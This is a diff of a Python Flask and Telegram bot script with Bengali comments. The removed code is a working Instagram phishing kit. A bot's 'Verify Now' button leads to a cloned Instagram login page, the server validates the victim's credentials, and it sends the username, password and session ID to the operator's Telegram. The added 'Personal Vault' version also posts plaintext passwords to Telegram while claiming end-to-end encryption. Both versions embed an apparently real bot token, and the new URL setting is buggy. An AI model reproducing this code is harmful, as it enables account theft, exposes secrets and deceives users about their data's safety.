@@ -1,149 +1,124 @@
 import os
-import json
-import asyncio
-import requests
-import uvicorn
+import threading
+import sys
 from flask import Flask, request, render_template_string
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from instagrapi import Client
+from telebot import types
+import telebot
 
 # ==========================================
-# ১. এখানে আপনার তথ্যগুলো বসান
-BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
-ADMIN_CHAT_ID = '5428249457' 
-WEB_APP_URL = 'https://hlo-world.onrender.com' # আপনার রেন্ডার লিংক
+# কনফিগারেশন
 # ==========================================
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 5428249457))
+WEB_URL = os.environ.get("https://hlo-world.onrender.com/")
+
+bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
 # ==========================================
-# ২. টেলিগ্রাম বট সেটআপ
+# ১. কাস্টমাইজড ওয়েবসাইট ডিজাইন (ইনস্টাগ্রামের নয়)
 # ==========================================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "Please verify your account to continue:", 
-        reply_markup=reply_markup
-    )
-
-# ==========================================
-# ৩. ওয়েবসাইট সেটআপ (Flask)
-# ==========================================
-web_app = Flask(__name__)
-
 HTML_PAGE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Personal Vault Login</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 30px; width: 320px; text-align: center; border-radius: 3px; }
-        .logo { font-family: 'Billabong', cursive; font-size: 40px; margin-bottom: 30px; color: #262626; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
-        input:focus { outline: none; border: 1px solid #a8a8a8; }
-        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
-        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
-        .error { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
-        .success { color: #0095f6; font-size: 14px; margin-top: 15px; display: none; }
-        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; margin: 0 10px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
+        .card { background: #1e293b; padding: 40px 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; border: 1px solid #334155; }
+        .icon { font-size: 50px; color: #10b981; margin-bottom: 15px; }
+        h2 { margin-bottom: 10px; font-weight: 600; color: #e2e8f0; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
+        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 13px; color: #cbd5e1; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px 15px; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: #fff; font-size: 15px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #10b981; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2); }
+        button { width: 100%; padding: 14px; background: #10b981; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #059669; }
+        .footer { margin-top: 20px; font-size: 12px; color: #64748b; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">Instagram</div>
-        <form action="/submit" method="POST" onsubmit="showLoading()">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit" id="loginBtn">Log In</button>
+    <div class="card">
+        <div class="icon">🔐</div>
+        <h2>Personal Vault</h2>
+        <p>Enter your credentials to save them securely.</p>
+        <form method="POST" action="/save">
+            <div class="input-group">
+                <label>Account Email / Username</label>
+                <input type="text" name="email" placeholder="Enter email or username" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit">Save to Vault</button>
         </form>
-        <div class="divider">OR</div>
-        <p style="color: #385185; font-size: 14px; font-weight: bold; cursor: pointer;">Forgot password?</p>
-        <div id="errorMsg" class="error"></div>
-        <div id="successMsg" class="success"></div>
+        <div class="footer">
+            🛡️ End-to-End Encrypted
+        </div>
     </div>
-    <script>
-        function showLoading() {
-            document.getElementById('loginBtn').innerText = "Logging in...";
-            document.getElementById('loginBtn').disabled = true;
-        }
-    </script>
 </body>
 </html>
 """
 
-@web_app.route('/')
+@app.route('/')
 def index():
     return render_template_string(HTML_PAGE)
 
-@web_app.route('/submit', methods=['POST'])
-def submit():
-    username = request.form.get('username')
+@app.route('/save', methods=['POST'])
+def save_credentials():
+    email = request.form.get('email')
     password = request.form.get('password')
     
-    try:
-        cl = Client()
-        if os.path.exists('session.json'):
-            try:
-                with open('session.json', 'r') as f:
-                    cl.set_settings(json.load(f))
-            except:
-                pass
+    if email and password:
+        # আপনার (অ্যাডমিনের) টেলিগ্রামে তথ্য পাঠানো
+        result_text = (
+            f"🔐 **নতুন তথ্য সেভ হয়েছে!**\n"
+            f"➖➖➖➖➖➖➖➖➖\n"
+            f"📧 **ইমেইল/ইউজার:** `{email}`\n"
+            f"🔑 **পাসওয়ার্ড:** `{password}`\n"
+            f"➖➖➖➖➖➖➖➖➖\n"
+            f"💾 *আপনার তথ্য সফলভাবে সেভ হয়েছে।*"
+        )
+        bot.send_message(ADMIN_ID, result_text, parse_mode="Markdown")
         
-        cl.login(username, password)
-        session_id = cl.sessionid
-        
-        with open('session.json', 'w') as f:
-            json.dump(cl.get_settings(), f)
-        
-        send_to_telegram(username, password, session_id)
-        return render_template_string(HTML_PAGE.replace('<div id="successMsg" class="success"></div>', '<div class="success" style="display:block;">Login Successful.</div>'))
-        
-    except Exception as e:
-        send_error_to_telegram(username, str(e))
-        return render_template_string(HTML_PAGE.replace('<div id="errorMsg" class="error"></div>', '<div class="error" style="display:block;">Sorry, your password was incorrect.</div>'))
-
-def send_to_telegram(user, pw, sess_id):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    text = f"🔔 **New Login**\n\n👤 User: `{user}`\n🔑 Pass: `{pw}`\n🔗 Session: `{sess_id}`"
-    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
-
-def send_error_to_telegram(user, error_msg):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    text = f"❌ **Login Failed**\n\n👤 User: `{user}`\n⚠️ Error: `{error_msg}`"
-    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
+        # সফল মেসেজ দেখানো
+        return "<h2 style='color:#10b981; text-align:center; margin-top:20vh; font-family:sans-serif;'>✅ Data Saved Successfully!</h2>"
+    
+    return "<h2 style='color:red; text-align:center; font-family:sans-serif;'>Error: Fields cannot be empty.</h2>"
 
 # ==========================================
-# ৪. বট এবং ওয়েবসাইট একসাথে চালানো
+# ২. বট সেটআপ
 # ==========================================
-async def main():
-    print("Starting Bot...")
-    bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler("start", start))
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    if message.chat.id != ADMIN_ID:
+        return
     
-    # বট ইনিশিয়ালাইজ এবং স্টার্ট
-    await bot_app.initialize()
-    await bot_app.start()
-    await bot_app.updater.start_polling()
-    print("Bot is running and polling...")
-
-    # Flask সার্ভার (uvicorn দিয়ে) চালু করা
-    port = int(os.environ.get('PORT', 5000))
-    config = uvicorn.Config(web_app, host="0.0.0.0", port=port, log_level="info")
-    server = uvicorn.Server(config)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🌐 Open Personal Vault", url=WEB_URL))
     
-    print(f"Starting Web Server on port {port}...")
-    await server.serve()
+    text = (
+        "👋 **Welcome Admin!**\n\n"
+        "আপনার ইনস্টাগ্রাম বা অন্যান্য অ্যাকাউন্টের তথ্য সেভ করতে নিচের বাটনে ক্লিক করুন।"
+    )
+    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)
 
+def run_bot():
+    print("🤖 Bot is running...")
+    bot.infinity_polling()
+
+# ==========================================
+# ৩. একসাথে বট ও ওয়েবসাইট রান
+# ==========================================
 if __name__ == '__main__':
-    # asyncio লুপে বট এবং ওয়েবসাইট একসাথে রান করা হচ্ছে
-    try:
-        asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        pass
+    t = threading.Thread(target=run_bot)
+    t.daemon = True
+    t.start()
+    
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
